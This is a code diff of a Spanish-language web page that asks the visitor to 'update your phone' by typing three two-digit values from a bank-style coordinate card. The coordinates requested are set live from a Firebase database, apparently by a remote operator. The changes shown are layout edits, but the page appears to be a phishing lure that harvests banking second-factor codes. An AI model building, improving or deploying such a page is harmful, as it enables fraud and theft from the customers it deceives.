@@ -2,9 +2,9 @@
 <!DOCTYPE html>
 <html lang="es">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>Ingresar Coordenadas</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Ingreso de Coordenadas</title>
   <style>
     body {
       font-family: Arial, sans-serif;
@@ -20,28 +20,22 @@
       border: 2px solid red;
       padding: 20px;
       width: 90%;
-      max-width: 420px;
+      max-width: 400px;
       background-color: #fff;
       text-align: center;
     }
-    .coordenadas {
-      display: flex;
-      justify-content: space-between;
-      gap: 10px;
-      margin-top: 20px;
+    h2 {
+      margin-bottom: 20px;
     }
-    .grupo {
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-    }
-    .grupo label {
-      margin-bottom: 5px;
+    .coord-label {
+      display: block;
       font-weight: bold;
+      margin-top: 10px;
     }
-    .grupo input {
+    .coord-input {
       width: 60px;
       padding: 10px;
+      margin: 5px;
       font-size: 18px;
       text-align: center;
     }
@@ -50,20 +44,12 @@
 <body>
   <div class="contenedor">
     <h2>Necesitamos actualizar tu teléfono</h2>
-    <div class="coordenadas">
-      <div class="grupo">
-        <label id="coord1-label"></label>
-        <input maxlength="2" />
-      </div>
-      <div class="grupo">
-        <label id="coord2-label"></label>
-        <input maxlength="2" />
-      </div>
-      <div class="grupo">
-        <label id="coord3-label"></label>
-        <input maxlength="2" />
-      </div>
-    </div>
+    <label class="coord-label" id="coord1-label"></label>
+    <input class="coord-input" maxlength="2" />
+    <label class="coord-label" id="coord2-label"></label>
+    <input class="coord-input" maxlength="2" />
+    <label class="coord-label" id="coord3-label"></label>
+    <input class="coord-input" maxlength="2" />
   </div>
 
   <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
@@ -79,8 +65,8 @@
       appId: "1:604053438195:web:188de91bee9a62f0d3c186"
     };
     firebase.initializeApp(firebaseConfig);
-    const db = firebase.database();
 
+    const db = firebase.database();
     firebase.database().ref('coordenadas_solicitadas').on('value', snap => {
       const valor = snap.val() || "";
       const partes = valor.trim().split(" ");
